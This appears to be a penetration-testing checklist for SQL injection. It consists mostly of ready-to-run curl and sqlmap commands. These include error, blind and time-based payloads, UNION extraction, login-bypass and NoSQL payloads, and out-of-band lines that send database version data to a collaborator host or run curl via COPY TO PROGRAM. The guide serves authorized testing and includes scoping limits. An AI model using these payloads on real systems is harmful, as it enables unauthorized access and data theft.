# SQL Injection (SQLi) Testing

## Objective

Identify inputs that are concatenated into SQL queries without parameterization, enabling an attacker to manipulate query logic, extract data, bypass authentication, or in some cases execute OS commands.

---

## 1. Identify Injection Points

Any parameter that interacts with a backend database is a candidate:
- URL path parameters: `/users/1`, `/products/search`
- Query string: `?id=1`, `?search=test`, `?sort=name`
- POST body: `username=admin`, `{"id":1}`
- HTTP headers: `Cookie`, `User-Agent`, `X-Forwarded-For`, `Referer`
- JSON/XML body fields

---

## 2. Error-Based Detection

```bash
BASE="https://target/api/users"
TOKEN="USER_TOKEN"

# Single quote — triggers SQL syntax error in unparameterized queries
curl -si "$BASE?id=1'" -H "Authorization: Bearer $TOKEN" \
  | grep -iE "sql|syntax|mysql|postgresql|ora-|unclosed|error"

# Double quote
curl -si "$BASE?id=1\"" -H "Authorization: Bearer $TOKEN" \
  | grep -iE "sql|syntax|error"

# Backslash
curl -si "$BASE?id=1\\" -H "Authorization: Bearer $TOKEN" \
  | grep -iE "sql|syntax|error"

# Comment characters
curl -si "$BASE?id=1--" -H "Authorization: Bearer $TOKEN" | grep HTTP
curl -si "$BASE?id=1%23" -H "Authorization: Bearer $TOKEN" | grep HTTP  # %23 = #
```

---

## 3. Boolean-Based Blind Detection

When no errors are returned, compare responses for `TRUE` vs `FALSE` conditions:

```bash
# Baseline — normal request
curl -si "$BASE?id=1" -H "Authorization: Bearer $TOKEN" | wc -c

# TRUE condition — should match baseline
curl -si "$BASE?id=1 AND 1=1--" -H "Authorization: Bearer $TOKEN" | wc -c

# FALSE condition — should differ from baseline
curl -si "$BASE?id=1 AND 1=2--" -H "Authorization: Bearer $TOKEN" | wc -c
```

**Vulnerable** if TRUE response ≈ baseline and FALSE response differs significantly.

MySQL:
```
?id=1 AND 1=1-- -     (true)
?id=1 AND 1=2-- -     (false)
?id=1 AND SUBSTRING(version(),1,1)='5'-- -
```

PostgreSQL:
```
?id=1 AND 1=1--
?id=1 AND 1=2--
?id=1 AND SUBSTRING(version(),1,11)='PostgreSQL'--
```

---

## 4. Time-Based Blind Detection

When no response difference exists, use time delays:

```bash
# MySQL — SLEEP(2) should add 2 seconds to response time
time curl -si "$BASE?id=1 AND SLEEP(2)-- -" \
  -H "Authorization: Bearer $TOKEN" | grep HTTP

# PostgreSQL
time curl -si "$BASE?id=1; SELECT pg_sleep(2)-- -" \
  -H "Authorization: Bearer $TOKEN" | grep HTTP

# MSSQL
time curl -si "$BASE?id=1; WAITFOR DELAY '0:0:2'-- -" \
  -H "Authorization: Bearer $TOKEN" | grep HTTP

# Oracle
time curl -si "$BASE?id=1 AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2)-- -" \
  -H "Authorization: Bearer $TOKEN" | grep HTTP
```

**Confirm:** Repeat time-based test 3x. Consistent delay = confirmed.

---

## 5. Union-Based Extraction (PoC — Table Name Only)

Once injection is confirmed, demonstrate impact with minimal data:

```bash
# Step 1: Find number of columns
curl -si "$BASE?id=1 ORDER BY 1--" | grep HTTP   # Works
curl -si "$BASE?id=1 ORDER BY 2--" | grep HTTP   # Works
curl -si "$BASE?id=1 ORDER BY 3--" | grep HTTP   # Error → 2 columns
# Repeat until error, then use column count - 1

# Step 2: Find injectable columns (MySQL, 2-column table)
curl -si "$BASE?id=-1 UNION SELECT NULL,NULL--" | grep HTTP
curl -si "$BASE?id=-1 UNION SELECT 1,2--" | grep HTTP

# Step 3: Extract database version (PoC only)
curl -s "$BASE?id=-1 UNION SELECT version(),2--" \
  -H "Authorization: Bearer $TOKEN"
# Expected: MySQL 8.0.xx or PostgreSQL 14.x

# PoC STOP HERE — do not extract tables, columns, or user data
```

---

## 6. Out-of-Band (OOB) SQLi Detection

For fully blind scenarios (no timing, no response difference):

```bash
# MySQL — DNS exfiltration (confirm OOB capability)
COLLAB="YOUR_COLLAB.burpcollaborator.net"

curl -si "$BASE?id=1 AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.$COLLAB\\\\share'))-- -" \
  -H "Authorization: Bearer $TOKEN" | grep HTTP

# PostgreSQL — OOB via copy
curl -si "$BASE?id=1;COPY(SELECT version()) TO PROGRAM 'curl $COLLAB'-- -" | grep HTTP
```

---

## 7. SQLi in Login Forms (Auth Bypass)

```bash
# Classic auth bypass
curl -si -X POST https://target/login \
  -d "username=admin'-- -&password=anything" | grep -iE "HTTP|welcome|dashboard"

# Boolean auth bypass
curl -si -X POST https://target/login \
  -d "username=admin' OR '1'='1'-- -&password=x" | grep HTTP

# NoSQL injection (MongoDB)
curl -si -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' | grep HTTP

# JSON SQL injection
curl -si -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\u0027-- -","password":"x"}' | grep HTTP
```

---

## 8. sqlmap Safe Usage

```bash
# Detect only — no exploitation
sqlmap -u "https://target/api/users?id=1" \
  --cookie="session=TOKEN" \
  --level=1 \
  --risk=1 \
  --technique=BT \
  --batch \
  --random-agent \
  --delay=1 \
  --output-dir=/tmp/sqlmap_$(date +%Y%m%d)

# Enumerate tables (if confirmed, for impact demonstration)
sqlmap -u "https://target/api/users?id=1" \
  --cookie="session=TOKEN" \
  --level=1 --risk=1 \
  --technique=BT \
  --tables --batch

# NEVER USE: --dump, --dump-all, --passwords, --os-shell, --os-cmd
```

---

## 9. Second-Order SQLi

Second-order SQLi is stored in the database and executed later:

```bash
# Step 1: Register with a SQLi payload in username
curl -si -X POST https://target/register \
  -d "username=admin'-- -&password=Test@123" | grep HTTP

# Step 2: Update profile using the stored username (triggers SQLi)
curl -si -X POST https://target/profile/update \
  -H "Cookie: session=MALICIOUS_USER_SESSION" \
  -d "bio=test" | grep -iE "sql|error|500"
```

---

## Evidence to Capture

- Full request with payload
- Response showing error message / different content / time delay
- Version string or table name confirming extraction capability
- Never include actual user data extracted from the database

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Error-based SQLi | Pass/Fail | Critical |
| Boolean-based blind SQLi | Pass/Fail | Critical |
| Time-based blind SQLi | Pass/Fail | High |
| Auth bypass via SQLi | Pass/Fail | Critical |
| NoSQL injection (MongoDB $ne) | Pass/Fail | Critical |
| SQLi in HTTP headers | Pass/Fail | High |
| Second-order SQLi | Pass/Fail | High |
